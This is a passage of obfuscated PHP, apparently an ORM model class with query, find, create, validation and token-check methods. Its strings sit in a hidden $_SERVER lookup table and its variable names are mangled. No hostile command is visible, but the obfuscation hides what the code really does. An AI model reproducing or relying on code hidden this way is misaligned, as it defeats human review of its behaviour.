{ return !1; } if (empty($§Ñö²’)) { return null; } $this->_afterSelect($§Ñö²’, $¹¦ó›ØÅ); return $§Ñö²’; } protected function _afterSelect(&$¸Ùã©ºô, $äŠÏÑä) { } public function buildSql($‹ó¥Ìº… = array()) { $ûæ–ÎÃ§ =& $_SERVER[ıÚ˜š²İ]; $‹ó¥Ìº… = $this->_parseOptions($‹ó¥Ìº…); return $ûæ–ÎÃ§[357] . $this->db->buildSelectSql($‹ó¥Ìº…) . $ûæ–ÎÃ§[358]; } public function optionsValue($ëºÅ«íõ = null) { if (is_null($ëºÅ«íõ)) { return $this->options; } elseif (is_array($ëºÅ«íõ)) { $this->options = array_merge($this->options, $ëºÅ«íõ); } } protected function _parseOptions($¯ÇÏî«µ = array()) { $‘¡›şï¶ =& $_SERVER[ıÚ˜š²İ]; if (is_array($¯ÇÏî«µ)) { $¯ÇÏî«µ = array_merge($this->options, $¯ÇÏî«µ); } $this->options = array(); if (!isset($¯ÇÏî«µ[$‘¡›şï¶[359]])) { $¯ÇÏî«µ[$‘¡›şï¶[359]] = $this->getTableName(); $™¤Òş™¨ = $this->fields; } else { $™¤Òş™¨ = $this->getDbFields(); } if (!empty($¯ÇÏî«µ[$‘¡›şï¶[360]])) { $¯ÇÏî«µ[$‘¡›şï¶[359]] .= $‘¡›şï¶[53] . $¯ÇÏî«µ[$‘¡›şï¶[360]]; } $¯ÇÏî«µ[$‘¡›şï¶[361]] = $this->name; if (isset($¯ÇÏî«µ[$‘¡›şï¶[355]]) && is_array($¯ÇÏî«µ[$‘¡›şï¶[355]]) && !empty($™¤Òş™¨) && !isset($¯ÇÏî«µ[$‘¡›şï¶[362]]) && !isset($¯ÇÏî«µ[$‘¡›şï¶[359]])) { foreach ($¯ÇÏî«µ[$‘¡›şï¶[355]] as $Õ€±«ïæ => $ò‚ö©•) { $Õ€±«ïæ = trim($Õ€±«ïæ); if (in_array($Õ€±«ïæ, $™¤Òş™¨, !0)) { if (is_scalar($ò‚ö©•)) { $this->_parseType($¯ÇÏî«µ[$‘¡›şï¶[355]], $Õ€±«ïæ); } } elseif (!is_numeric($Õ€±«ïæ) && $‘¡›şï¶[11] != substr($Õ€±«ïæ, 0, 1) && !1 === strpos($Õ€±«ïæ, $‘¡›şï¶[10]) && !1 === strpos($Õ€±«ïæ, $‘¡›şï¶[340]) && !1 === strpos($Õ€±«ïæ, $‘¡›şï¶[215]) && !1 === strpos($Õ€±«ïæ, $‘¡›şï¶[287])) { unset($¯ÇÏî«µ[$‘¡›şï¶[355]][$Õ€±«ïæ]); } } } $this->_options_filter($¯ÇÏî«µ); return $¯ÇÏî«µ; } protected function _options_filter(&$­µ’Œ™ß) { } protected function _parseType(&$Íİ ò±–, $ˆÂ¼Ğ¯­) { $üà‹»ïÉ =& $_SERVER[ıÚ˜š²İ]; if (empty($this->options[$üà‹»ïÉ[363]][$üà‹»ïÉ[4] . $ˆÂ¼Ğ¯­])) { $­óê£Æ = strtolower($this->fields[$üà‹»ïÉ[332]][$ˆÂ¼Ğ¯­]); if (!1 !== strpos($­óê£Æ, $üà‹»ïÉ[364])) { } elseif (!1 === strpos($­óê£Æ, $üà‹»ïÉ[365]) && !1 !== strpos($­óê£Æ, $üà‹»ïÉ[366])) { $Íİ ò±–[$ˆÂ¼Ğ¯­] = intval($Íİ ò±–[$ˆÂ¼Ğ¯­]); } elseif (!1 !== strpos($­óê£Æ, $üà‹»ïÉ[367]) || !1 !== strpos($­óê£Æ, $üà‹»ïÉ[368])) { $Íİ ò±–[$ˆÂ¼Ğ¯­] = floatval($Íİ ò±–[$ˆÂ¼Ğ¯­]); } elseif (!1 !== strpos($­óê£Æ, $üà‹»ïÉ[369])) { $Íİ ò±–[$ˆÂ¼Ğ¯­] = (bool) $Íİ ò±–[$ˆÂ¼Ğ¯­]; } } } public function find($¢Åß¨¥¹ = array()) { $Ÿ²óÈäŠ =& $_SERVER[ıÚ˜š²İ]; if (is_numeric($¢Åß¨¥¹) || is_string($¢Åß¨¥¹)) { $•ˆ–Øò[$this->getPk()] = intval($¢Åß¨¥¹); $this->options[$Ÿ²óÈäŠ[355]] = $•ˆ–Øò; } $this->options[$Ÿ²óÈäŠ[370]] = 1; $¢Åß¨¥¹ = $this->_parseOptions(); $†ÅË›¨ú = $this->db->select($¢Åß¨¥¹); if (!1 === $†ÅË›¨ú) { return !1; } if (empty($†ÅË›¨ú)) { return null; } $©ââ´ø¤ = $†ÅË›¨ú[0]; $this->_afterFind($©ââ´ø¤, $¢Åß¨¥¹); return $©ââ´ø¤; } protected function _afterFind(&$Ï³ÕÆ“ş, $›¨ÆñÂ ) { } protected function returnResult($ØåÇØí‚, $ëÃ†˜Øı = '') { $¸«Ÿñ =& $_SERVER[ıÚ˜š²İ]; if ($ëÃ†˜Øı) { if (is_callable($ëÃ†˜Øı)) { return call_user_func($ëÃ†˜Øı, $ØåÇØí‚); } switch (strtolower($ëÃ†˜Øı)) { case $¸«Ÿñ[371]: return json_encode($ØåÇØí‚); case $¸«Ÿñ[372]: return xml_encode($ØåÇØí‚); } } return $ØåÇØí‚; } public function parseFieldsMap($«§éåÌö, $‰Ÿò€Ì€ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $”€¢áëÇ => $ñ·éú‚) { if ($‰Ÿò€Ì€ == 1) { if (isset($«§éåÌö[$ñ·éú‚])) { $«§éåÌö[$”€¢áëÇ] = $«§éåÌö[$ñ·éú‚]; unset($«§éåÌö[$ñ·éú‚]); } } else { if (isset($«§éåÌö[$”€¢áëÇ])) { $«§éåÌö[$ñ·éú‚] = $«§éåÌö[$”€¢áëÇ]; unset($«§éåÌö[$”€¢áëÇ]); } } } } return $«§éåÌö; } public function setField($ÇÜë÷, $İáÕÅ™ì = '') { if (is_array($ÇÜë÷)) { $ç…ò»ÛÊ = $ÇÜë÷; } else { $ç…ò»ÛÊ[$ÇÜë÷] = $İáÕÅ™ì; } return $this->save($ç…ò»ÛÊ); } public function setAdd($»‡ÏÉ¶ù, $·æĞà¥å = 1) { $‹ÂëÛåŸ =& $_SERVER[ıÚ˜š²İ]; $Ò‡¹ÇÜ = $»‡ÏÉ¶ù . $‹ÂëÛåŸ[373] . $·æĞà¥å; if ($·æĞà¥å < 0) { $Ò‡¹ÇÜ = $»‡ÏÉ¶ù . $·æĞà¥å; } return $this->setField($»‡ÏÉ¶ù, array($‹ÂëÛåŸ[374], $Ò‡¹ÇÜ)); } public function getField($ÚøÁ½¸¥, $òü†£½á = null) { $“†îÎıÍ =& $_SERVER[ıÚ˜š²İ]; $èÍÇş›[$“†îÎıÍ[353]] = $ÚøÁ½¸¥; $èÍÇş› = $this->_parseOptions($èÍÇş›); $ÚøÁ½¸¥ = trim($ÚøÁ½¸¥); if (strpos($ÚøÁ½¸¥, $“†îÎıÍ[50])) { if (!isset($èÍÇş›[$“†îÎıÍ[370]])) { $èÍÇş›[$“†îÎıÍ[370]] = is_numeric($òü†£½á) ? $òü†£½á : $“†îÎıÍ[12]; } $ˆÜÉ´‚« = $this->db->select($èÍÇş›); if (!empty($ˆÜÉ´‚«)) { $ø­“–£å = explode($“†îÎıÍ[50], $ÚøÁ½¸¥); $ÚøÁ½¸¥ = array_keys($ˆÜÉ´‚«[0]); $üøû’Ñ“ = array_shift($ÚøÁ½¸¥); $‹•¸¥É‰ = array_shift($ÚøÁ½¸¥); $›ƒÌ°Õ… = array(); $¸í¤Ÿı´ = count($ø­“–£å); foreach ($ˆÜÉ´‚« as $º¡‚Û©Ş) { $„ˆî¤õ• = $º¡‚Û©Ş[$üøû’Ñ“]; if (2 == $¸í¤Ÿı´) { $›ƒÌ°Õ…[$„ˆî¤õ•] = $º¡‚Û©Ş[$‹•¸¥É‰]; } else { $›ƒÌ°Õ…[$„ˆî¤õ•] = is_string($òü†£½á) ? implode($òü†£½á, $º¡‚Û©Ş) : $º¡‚Û©Ş; } } return $›ƒÌ°Õ…; } } else { if (!0 !== $òü†£½á) { $èÍÇş›[$“†îÎıÍ[370]] = is_numeric($òü†£½á) ? $òü†£½á : 1; } if ($òü†£½á === $“†îÎıÍ[335]) { unset($èÍÇş›[$“†îÎıÍ[370]]); } $º¡‚Û©Ş = $this->db->select($èÍÇş›); if (!empty($º¡‚Û©Ş)) { if ($òü†£½á === $“†îÎıÍ[335]) { return reset($º¡‚Û©Ş[0]); } if (!0 !== $òü†£½á && 1 == $èÍÇş›[$“†îÎıÍ[370]]) { return reset($º¡‚Û©Ş[0]); } foreach ($º¡‚Û©Ş as $–Ìòˆğ©) { $—€¶Û¢[] = $–Ìòˆğ©[$ÚøÁ½¸¥]; } return $—€¶Û¢; } } return null; } public function create($êºß”Ëâ = '', $ŸËÆÈÆş = '') { $™Ó—¥Ø =& $_SERVER[ıÚ˜š²İ]; if (empty($êºß”Ëâ)) { $êºß”Ëâ = $_POST; } elseif (is_object($êºß”Ëâ)) { $êºß”Ëâ = get_object_vars($êºß”Ëâ); } if (empty($êºß”Ëâ) || !is_array($êºß”Ëâ)) { $this->error = think_lang($™Ó—¥Ø[351]); return !1; } $êºß”Ëâ = $this->parseFieldsMap($êºß”Ëâ, 0); $ŸËÆÈÆş = $ŸËÆÈÆş ? $ŸËÆÈÆş : (!empty($êºß”Ëâ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$™Ó—¥Ø[353]])) { $ºÈÑ”¶º = $this->options[$™Ó—¥Ø[353]]; unset($this->options[$™Ó—¥Ø[353]]); } elseif ($ŸËÆÈÆş == THINK_MODEL_INSERT && isset($this->insertFields)) { $ºÈÑ”¶º = $this->insertFields; } elseif ($ŸËÆÈÆş == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ºÈÑ”¶º = $this->updateFields; } if (isset($ºÈÑ”¶º)) { if (is_string($ºÈÑ”¶º)) { $ºÈÑ”¶º = explode($™Ó—¥Ø[50], $ºÈÑ”¶º); } if (think_config($™Ó—¥Ø[375])) { $ºÈÑ”¶º[] = think_config($™Ó—¥Ø[376]); } foreach ($êºß”Ëâ as $ Æ“Öë => $€·œÅû) { if (!in_array($ Æ“Öë, $ºÈÑ”¶º)) { unset($êºß”Ëâ[$ Æ“Öë]); } } } if (!$this->autoValidation($êºß”Ëâ, $ŸËÆÈÆş)) { return !1; } if (!$this->autoCheckToken($êºß”Ëâ)) { $this->error = think_lang($™Ó—¥Ø[377]); return !1; } if ($this->autoCheckFields) { $ºÈÑ”¶º = $this->getDbFields(); foreach ($êºß”Ëâ as $ Æ“Öë => $€·œÅû) { if (!in_array($ Æ“Öë, $ºÈÑ”¶º)) { unset($êºß”Ëâ[$ Æ“Öë]); } elseif (MAGIC_QUOTES_GPC && is_string($€·œÅû)) { $êºß”Ëâ[$ Æ“Öë] = stripslashes($€·œÅû); } } } $this->autoOperation($êºß”Ëâ, $ŸËÆÈÆş); $this->data = $êºß”Ëâ; return $êºß”Ëâ; } public function autoCheckToken($ªıÏãï) { $ò¿‡í×“ =& $_SERVER[ıÚ˜š²İ]; if (isset($this->options[$ò¿‡í×“[378]]) && !$this->options[$ò¿‡í×“[378]]) { return !0; } if (think_config($ò¿‡í×“[375])) { $ÜÓ¯˜…â = think_config($ò¿‡í×“[376]); if (!isset($ªıÏãï[$ÜÓ¯˜…â]) || Session::get($ÜÓ¯˜…â)) { return !1; } list($’‰ô­Ë¬, $ËÁØÊ¶ò) = explode($ò¿‡í×“[11], $ªıÏãï[$ÜÓ¯˜…â]); if ($ËÁØÊ¶ò && Session::get($ÜÓ¯˜…â . $ò¿‡í×“[10] . $’‰ô­Ë¬) === $ËÁØÊ¶ò) { Session::remove($ÜÓ¯˜…â . $ò¿‡í×“[10] . $’‰ô­Ë¬); return !0; } if (think_config($ò¿‡í×“[379])) { Session::remove($ÜÓ¯˜…â . $ò¿‡í×“[10] . $’‰ô­Ë¬); } return !1; } return !0; } public function regex($¢£Ú›Çñ, $Ì÷È÷š—) { $º‘ğÔÑ‚ =& $_SERVER[ıÚ˜š²İ]; $†ü¸»¹ï = array($º‘ğÔÑ‚[380] => $º‘ğÔÑ‚[381], $º‘ğÔÑ‚[382] => $º‘ğÔÑ‚[383], $º‘ğÔÑ‚[384] => $º‘ğÔÑ‚[385], $º‘ğÔÑ‚[386] => $º‘ğÔÑ‚[387], $º‘ğÔÑ‚[388] => $º‘ğÔÑ‚[389], $º‘ğÔÑ‚[390] => $º‘ğÔÑ‚[391], $º‘ğÔÑ‚[392] => $º‘ğÔÑ‚[393], $º‘ğÔÑ‚[368] => $º‘ğÔÑ‚[394], $º‘ğÔÑ‚[395] => $º‘ğÔÑ‚[396]); if (isset($†ü¸»¹ï[strtolower($Ì÷È÷š—)])) { $Ì÷È÷š— = $†ü¸»¹ï[strtolower($Ì÷È÷š—)]; } return preg_match($Ì÷È÷š—, $¢£Ú›Çñ) === 1; } private function autoOperation(&$ŒÌĞóş¦, $šş ´…È) { $½™ÅÄ =& $_SERVER[ıÚ˜š²İ]; if (!empty($this->options[$½™ÅÄ[397]])) { $†»»•· = $this->options[$½™ÅÄ[397]]; unset($this->options[$½™ÅÄ[397]]); } elseif (!empty($this->_auto)) { $†»»•· = $this->_auto; } if (isset($†»»•·)) { foreach ($†»»•· as $µğ°€ø×) { if (empty($µğ°€ø×[2])) { $µğ°€ø×[2] = THINK_MODEL_INSERT; } if ($šş ´…È == $µğ°€ø×[2] || $µğ°€ø×[2] == THINK_MODEL_BOTH) { switch (trim($µğ°€ø×[3])) { case $½™ÅÄ[398]: case $½™ÅÄ[399]: $öÏ’—Ã› = isset($µğ°€ø×[4]) ? (array) $µğ°€ø×[4] : array(); if (isset($ŒÌĞóş¦[$µğ°€ø×[0]])) { array_unshift($öÏ’—Ã›, $ŒÌĞóş¦[$µğ°€ø×[0]]); } if ($½™ÅÄ[398] == $µğ°€ø×[3]) { $ŒÌĞóş¦[$µğ°€ø×[0]] = call_user_func_array($µğ°€ø×[1], $öÏ’—Ã›); } else { $ŒÌĞóş¦[$µğ°€ø×[0]] = call_user_func_array(array(&$this, $µğ°€ø×[1]), $öÏ’—Ã›); } break; case $½™ÅÄ[353]: $ŒÌĞóş¦[$µğ°€ø×[0]] = $ŒÌĞóş¦[$µğ°€ø×[1]]; break; case $½™ÅÄ[400]: if ($½™ÅÄ[12] === $ŒÌĞóş¦[$µğ°€ø×[0]]) { unset($ŒÌĞóş¦[$µğ°€ø×[0]]); } break; case $½™ÅÄ[401]: default: $ŒÌĞóş¦[$µğ°€ø×[0]] = $µğ°€ø×[1]; } if (!1 === $ŒÌĞóş¦[$µğ°€ø×[0]]) { unset($ŒÌĞóş¦[$µğ°€ø×[0]]); } } } } return $ŒÌĞóş¦; } protected function autoValidation($œ‰‘¨úª, $°¿ß°˜Ï) { $à± Ô«Ğ =& $_SERVER[ıÚ˜š²İ]; if (!empty($this->options[$à± Ô«Ğ[402]])) { $¥Ù³ñÑ‚ = $this->options[$à± Ô«Ğ[402]]; unset($this->options[$à± Ô«Ğ[402]]); } elseif (!empty($this->_validate)) { $¥Ù³ñÑ‚ = $this->_validate; } if (isset($¥Ù³ñÑ‚)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¥Ù³ñÑ‚ as $„Íµéìî => $£ô¯¡Ä¶) { if (empty($£ô¯¡Ä¶[5]) || $£ô¯¡Ä¶[5] == THINK_MODEL_BOTH || $£ô¯¡Ä¶[5] == $°¿ß°˜Ï) { if (0 == strpos($£ô¯¡Ä¶[2], $à± Ô«Ğ[403]) && strpos($£ô¯¡Ä¶[2], $à± Ô«Ğ[404])) { $£ô¯¡Ä¶[2] = think_lang(substr($£ô¯¡Ä¶[2], 2, -1)); } $£ô¯¡Ä¶[3] = isset($£ô¯¡Ä¶[3]) ? $£ô¯¡Ä¶[3] : THINK_EXISTS_VALIDATE; $£ô¯¡Ä¶[4] = isset($£ô¯¡Ä¶[4]) ? $£ô¯¡Ä¶[4] : $à± Ô«Ğ[405]; switch ($£ô¯¡Ä¶[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($œ‰‘¨úª, $£ô¯¡Ä¶)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($à± Ô«Ğ[12] != trim($œ‰‘¨úª[$£ô¯¡Ä¶[0]])) { if (!1 === $this->_validationField($œ‰‘¨úª, $£ô¯¡Ä¶)) { return !1; } } break; default: if (isset($œ‰‘¨úª[$£ô¯¡Ä¶[0]])) { if (!1 === $this->_validationField($œ‰‘¨úª, $£ô¯¡Ä¶)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ğ¬œ‘ğÉ, $ÄùÖÃğ) { if (!1 === $this->_validationFieldItem($Ğ¬œ‘ğÉ, $ÄùÖÃğ)) { if ($this->patchValidate) { $this->error[$ÄùÖÃğ[0]] = $ÄùÖÃğ[2]; } else { $this->error = $ÄùÖÃğ[2]; return !1; } } return; } protected function _validationFieldItem($à“Ã¾Òß, $ĞğåíòÉ) { $°äéåÏâ =& $_SERVER[ıÚ˜š²İ]; switch (strtolower(trim($ĞğåíòÉ[4]))) { case $°äéåÏâ[398]: case $°äéåÏâ[399]: $¹Â˜Ì¾° = isset($ĞğåíòÉ[6]) ? (array) $ĞğåíòÉ[6] : array(); if (is_string($ĞğåíòÉ[0]) && strpos($ĞğåíòÉ[0], $°äéåÏâ[50])) { $ĞğåíòÉ[0] = explode($°äéåÏâ[50], $ĞğåíòÉ[0]); } if (is_array($ĞğåíòÉ[0])) { foreach ($ĞğåíòÉ[0] as $ÇÏ—Á„) { $×âÈÛ[$ÇÏ—Á„] = $à“Ã¾Òß[$ÇÏ—Á„]; } array_unshift($¹Â˜Ì¾°, $×âÈÛ); } else { array_unshift($¹Â˜Ì¾°, $à“Ã¾Òß[$ĞğåíòÉ[0]]); } if ($°äéåÏâ[398] == $ĞğåíòÉ[4]) { return call_user_func_array($ĞğåíòÉ[1], $¹Â˜Ì¾°); } else { return call_user_func_array(array(&$this, $ĞğåíòÉ[1]), $¹Â˜Ì¾°); } case $°äéåÏâ[406]: return $à“Ã¾Òß[$ĞğåíòÉ[0]] == $à“Ã¾Òß[$ĞğåíòÉ[1]]; case $°äéåÏâ[407]: if (is_string($ĞğåíòÉ[0]) && strpos($ĞğåíòÉ[0], $°äéåÏâ[50])) { $ĞğåíòÉ[0] = explode($°äéåÏâ[50], $ĞğåíòÉ[0]); } $¤û¡ªÙî = array(); if (is_array($ĞğåíòÉ[0])) { foreach ($ĞğåíòÉ[0] as $ÇÏ—Á„) { $¤û¡ªÙî[$ÇÏ—Á„] = $à“Ã¾Òß[$ÇÏ—Á„]; } } else { $¤û¡ªÙî[$ĞğåíòÉ[0]] = $à“Ã¾Òß[$ĞğåíòÉ[0]]; } if (!empty($à“Ã¾Òß[$this->getPk()])) { $¤û¡ªÙî[$this->getPk()] = array($°äéåÏâ[408], $à“Ã¾Òß[$this->getPk()]); } if ($this->where($¤û¡ªÙî)->find()) { return !1; } return !0; default: return $this->check($à“Ã¾Òß[$ĞğåíòÉ[0]], $ĞğåíòÉ[1], $ĞğåíòÉ[4]); } } public function check($‘–Œô¯ú, $—åŞ¯Ú, $‘Âêİß‰ = "\x72\145\x67\x65\170") { $¯ÇÄ˜ó… =& $_SERVER[ıÚ˜š²İ]; $‘Âêİß‰ = strtolower(trim($‘Âêİß‰)); switch ($‘Âêİß‰) { case $¯ÇÄ˜ó…[7]: case $¯ÇÄ˜ó…[409]: $ ‡äÔÑ = is_array($—åŞ¯Ú) ? $—åŞ¯Ú : explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú); return $‘Âêİß‰ == $¯ÇÄ˜ó…[7] ? in_array($‘–Œô¯ú, $ ‡äÔÑ) : !in_array($‘–Œô¯ú, $ ‡äÔÑ); case $¯ÇÄ˜ó…[410]: case $¯ÇÄ˜ó…[411]: if (is_array($—åŞ¯Ú)) { $æ•†¾¶ = $—åŞ¯Ú[0]; $ôıå«ÂŒ = $—åŞ¯Ú[1]; } else { list($æ•†¾¶, $ôıå«ÂŒ) = explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú); } return $‘Âêİß‰ == $¯ÇÄ˜ó…[410] ? $‘–Œô¯ú >= $æ•†¾¶ && $‘–Œô¯ú <= $ôıå«ÂŒ : $‘–Œô¯ú < $æ•†¾¶ || $‘–Œô¯ú > $ôıå«ÂŒ; case $¯ÇÄ˜ó…[412]: case $¯ÇÄ˜ó…[413]: return $‘Âêİß‰ == $¯ÇÄ˜ó…[412] ? $‘–Œô¯ú == $—åŞ¯Ú : $‘–Œô¯ú != $—åŞ¯Ú; case $¯ÇÄ˜ó…[414]: $¡Õ¼òö“ = mb_strlen($‘–Œô¯ú, $¯ÇÄ˜ó…[415]); if (strpos($—åŞ¯Ú, $¯ÇÄ˜ó…[50])) { list($æ•†¾¶, $ôıå«ÂŒ) = explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú); return $¡Õ¼òö“ >= $æ•†¾¶ && $¡Õ¼òö“ <= $ôıå«ÂŒ; } else { return $¡Õ¼òö“ == $—åŞ¯Ú; } case $¯ÇÄ˜ó…[416]: list($¾ô×½¨ó, $İ–Èä) = explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú); if (!is_numeric($¾ô×½¨ó)) { $¾ô×½¨ó = strtotime($¾ô×½¨ó); } if (!is_numeric($İ–Èä)) { $İ–Èä = strtotime($İ–Èä); } return NOW_TIME >= $¾ô×½¨ó && NOW_TIME <= $İ–Èä; case $¯ÇÄ˜ó…[417]: return in_array(get_client_ip(), explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú)); case $¯ÇÄ˜ó…[418]: return !in_array(get_client_ip(), explode($¯ÇÄ˜ó…[50], $—åŞ¯Ú)); case $¯ÇÄ˜ó…[405]: default: return $this->regex($‘–Œô¯ú, $—åŞ¯Ú); } } public function query($¿œçù€, $—¾¤©Æş = false) { $ìøÆÊ¤® =& $_SERVER[ıÚ˜š²İ]; if (!is_bool($—¾¤©Æş) && !is_array($—¾¤©Æş)) { $—¾¤©Æş = func_get_args(); array_shift($—¾¤©Æş); } $¿œçù€ = str_replace(array($ìøÆÊ¤®[288], $ìøÆÊ¤®[419]), $ìøÆÊ¤®[53], $¿œçù€); $¿œçù€ = $this->parseSql($¿œçù€, $—¾¤©Æş); return $this->db->query($¿œçù€); } public function execute($ÏÚ¡öÂ, $¶èáèÄ = false) { if (!is_bool($¶èáèÄ) && !is_array($¶èáèÄ)) { $¶èáèÄ = func_get_args(); array_shift($¶èáèÄ); } $ÏÚ¡öÂ = $this->parseSql($ÏÚ¡öÂ, $¶èáèÄ); return $this->db->execute($ÏÚ¡öÂ); } protected function parseSql($ßçˆš›‡, $‡ñÎ¶Æ) { $§‹Ö²°» =& $_SERVER[ıÚ˜š²İ]; if (!0 === $‡ñÎ¶Æ) { $­›Ô¬ˆœ = $this->_parseOptions(); $ßçˆš›‡ = $this->db->parseSql($ßçˆš›‡, $­›Ô¬ˆœ); } elseif (is_array($‡ñÎ¶Æ)) { $‡ñÎ¶Æ = array_map(array($this->db, $§‹Ö²°»[420]), $‡ñÎ¶Æ); $ßçˆš›‡ = vsprintf($ßçˆš›‡, $‡ñÎ¶Æ); } else { $ßçˆš›‡ = strtr($ßçˆš›‡, array($§‹Ö²°»[421] => $this->getTableName(), $§‹Ö²°»[422] => think_config($§‹Ö²°»[324]))); } $this->db->setModel($this->name); return $ßçˆš›‡; } public function db($èØÛŠ¸« = '', $Ïä´½‘ = '', $ü¢™Á–ª = array()) { $ûÏúÖ =& $_SERVER[ıÚ˜š²İ]; if ($ûÏúÖ[12] === $èØÛŠ¸« && $this->db) { return $this->db; } static $ºÃôë³ = array(); static $ÅÏ½»ãö = array(); if (!isset($ÅÏ½»ãö[$èØÛŠ¸«]) || isset($ÅÏ½»ãö[$èØÛŠ¸«]) && $Ïä´½‘ && $ºÃôë³[$èØÛŠ¸«] != $Ïä´½‘) { if (!empty($Ïä´½‘) && is_string($Ïä´½‘) && !1 === strpos($Ïä´½‘, $ûÏúÖ[8])) { $Ïä´½‘ = think_config($Ïä´½‘); } $èØÛŠ¸« = think_guid($Ïä´½‘); $ÅÏ½»ãö[$èØÛŠ¸«] = Db::getInstance($Ïä´½‘); } elseif (NULL === $Ïä´½‘) { $ÅÏ½»ãö[$èØÛŠ¸«]->close(); unset($ÅÏ½»ãö[$èØÛŠ¸«]); return; } if (!empty($ü¢™Á–ª)) { if (is_string($ü¢™Á–ª)) { parse_str($ü¢™Á–ª, $ü¢™Á–ª); } foreach ($ü¢™Á–ª as $İ›˜Òş  => $»„±Å’Ñ) { $this->setProperty($İ›˜Òş , $»„±Å’Ñ); } } $ºÃôë³[$èØÛŠ¸«] = $Ïä´½‘; $this->db = $ÅÏ½»ãö[$èØÛŠ¸«]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $®çŞºõÇ = get_class($this); if ($®çŞºõÇ == $_SERVER[ıÚ˜š²İ][423]) { return $this->name; } $this->name = substr($®çŞºõÇ, 0, -5); } return $this->name; } public function getTableName() { $ÕÎÓäâª =& $_SERVER[ıÚ˜š²İ]; if (empty($this->trueTableName)) { $€ÍŸŞ¬à = !empty($this->tablePrefix) ? $this->tablePrefix : $ÕÎÓäâª[12]; if (!empty($this->tableName)) { $€ÍŸŞ¬à .= $this->tableName; } else { $€ÍŸŞ¬à .= think_parse_name($this->name); } $this->trueTableName = strtolower($€ÍŸŞ¬à); } return (!empty($this->dbName) ? $this->dbName . $ÕÎÓäâª[10] : $ÕÎÓäâª[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ïÀ™ÇÂÒ =& $_SERVER[ıÚ˜š²İ]; return isset($this->fields[$ïÀ™ÇÂÒ[331]]) ? $this->fields[$ïÀ™ÇÂÒ[331]] : $this->pk; } public function getDbFields() { $¤ÛÁöØ =& $_SERVER[ıÚ˜š²İ]; if (isset($this->options[$¤ÛÁöØ[359]])) { $•ú‰«¯ô = $this->db->getFields($this->options[$¤ÛÁöØ[359]]); return $•ú‰«¯ô ? array_keys($•ú‰«¯ô) : !1; } if ($this->fields) { $•ú‰«¯ô = $this->fields; unset($•ú‰«¯ô[$¤ÛÁöØ[330]], $•ú‰«¯ô[$¤ÛÁöØ[331]], $•ú‰«¯ô[$¤ÛÁöØ[332]], $•ú‰«¯ô[$¤ÛÁöØ[329]]); return $•ú‰«¯ô; } return !1; } public function data($€€µŞ†Ï = '') { $Ò©œŒŞù =& $_SERVER[ıÚ˜š²İ]; if ($Ò©œŒŞù[12] === $€€µŞ†Ï && !empty($this->data)) { return $this->data; } if (is_object($€€µŞ†Ï)) { $€€µŞ†Ï = get_object_vars($€€µŞ†Ï); } elseif (is_string($€€µŞ†Ï)) { parse_str($€€µŞ†Ï, $€€µŞ†Ï); } elseif (!is_array($€€µŞ†Ï)) { think_exception(think_lang($Ò©œŒŞù[351])); } $this->data = $€€µŞ†Ï; return $this; } public function join($ËÆÚö¾¤) { $áıˆ©›Ö =& $_SERVER[ıÚ˜š²İ]; if (is_array($ËÆÚö¾¤)) { $this->options[$áıˆ©›Ö[362]] = $ËÆÚö¾¤; } elseif (!empty($ËÆÚö¾¤)) { $this->options[$áıˆ©›Ö[362]][] = $ËÆÚö¾¤; } return $this; } public function union($Œ™Ó·½ˆ, $È…³Êò = false) { $Ÿ¼ïŠ›ß =& $_SERVER[ıÚ˜š²İ]; if (empty($Œ™Ó·½ˆ)) { return $this; } if ($È…³Êò) { $this->options[$Ÿ¼ïŠ›ß[424]][$Ÿ¼ïŠ›ß[425]] = !0; } if (is_object($Œ™Ó·½ˆ)) { $Œ™Ó·½ˆ = get_object_vars($Œ™Ó·½ˆ); } if (is_string($Œ™Ó·½ˆ)) { $çÆ¤™É— = $Œ™Ó·½ˆ; } elseif (is_array($Œ™Ó·½ˆ)) { if (isset($Œ™Ó·½ˆ[0])) { $this->options[$Ÿ¼ïŠ›ß[424]] = array_merge($this->options[$Ÿ¼ïŠ›ß[424]], $Œ™Ó·½ˆ); return $this; } else { $çÆ¤™É— = $Œ™Ó·½ˆ; } } else { think_exception(think_lang($Ÿ¼ïŠ›ß[351])); } $this->options[$Ÿ¼ïŠ›ß[424]][] = $çÆ¤™É—; return $this; } public function cache($¼™îËŠƒ = true, $ğê›± Å = null, $„×úã¥± = '') { $¤±ëú‚İ =& $_SERVER[ıÚ˜š²İ]; if (!1 !== $¼™îËŠƒ) { $this->options[$¤±ëú‚İ[426]] = array($¤±ëú‚İ[97] => $¼™îËŠƒ, $¤±ëú‚İ[416] => $ğê›± Å, $¤±ëú‚İ[33] => $„×úã¥±); } return $this; } public function field($•°¹˜ôı, $ª›­êğ‡ = false) { $™ÁóÛ =& $_SERVER[ıÚ˜š²İ]; if (!0 === $•°¹˜ôı) { $ÉÚÑáÌú = $this->getDbFields(); $•°¹˜ôı = $ÉÚÑáÌú ? $ÉÚÑáÌú : $™ÁóÛ[223]; } elseif ($ª›­êğ‡) { if (is_string($•°¹˜ôı)) { $•°¹˜ôı = explode($™ÁóÛ[50], $•°¹˜ôı); } $ÉÚÑáÌú = $this->getDbFields(); $•°¹˜ôı = $ÉÚÑáÌú ? array_diff($ÉÚÑáÌú, $•°¹˜ôı) : $•°¹˜ôı; } $this->options[$™ÁóÛ[353]] = $•°¹˜ôı; return $this; } public function scope($òÂıíİ = '', $É¬µ¯Ä¢ = 